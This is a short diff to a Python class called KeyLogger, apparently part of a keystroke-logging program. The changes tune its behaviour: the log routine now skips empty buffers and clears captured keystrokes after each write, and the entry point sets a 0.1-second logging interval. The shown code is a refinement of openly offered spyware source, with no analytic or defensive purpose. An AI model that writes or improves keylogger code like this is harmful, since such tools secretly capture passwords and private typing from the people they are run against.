@@ -62,8 +62,11 @@ class KeyLogger:
         pythoncom.PumpMessages()
 
     def log(self,event=None):
+        if not self.keylog_data:
+            return 
         try:
             self.log_method(event=event)
+            self.keylog_data = []
         except Exception as e:
             print('Error occured: ',e) # logging
             print("Clearing log data...")
@@ -102,5 +105,5 @@ class KeyLogger:
         self.key_strokes = ""
 
 if __name__ == "__main__":
-    keylogger = KeyLogger(log_method=1)
+    keylogger = KeyLogger(log_method=1,time_interval=0.1)
     keylogger.run()
